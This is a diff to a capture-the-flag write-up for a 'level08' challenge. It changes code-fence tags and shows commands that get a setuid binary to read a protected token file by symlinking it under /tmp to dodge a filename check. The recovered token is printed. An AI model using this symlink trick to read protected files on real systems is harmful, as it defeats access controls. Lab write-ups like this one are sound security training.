@@ -4,8 +4,7 @@
 
 - Here we have a `level08` executable and a `token` file who cannot be read.
 
-```
-sh
+```console
 $ ls -l
 total 16
 -rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
@@ -16,7 +15,7 @@ total 16
 
 - The executable refuses to read the `token` file.
 
-```sh
+```console
 $ ./level08
 ./level08 [file to read]
 $ ./level08 token
@@ -40,7 +39,7 @@ if (strstr(argv[1], "token") != 0) {
 - A way to bypass this restriction is to create a symbolic link.
 - As we still don't have write rights on our folder, let use the `/tmp/` folder for a change.
 
-```sh
+```console
 $ ln -s /home/user/level08/token /tmp/the_key
 $ ./level08 /tmp/the_key
 quif5eloekouj29ke0vouxean
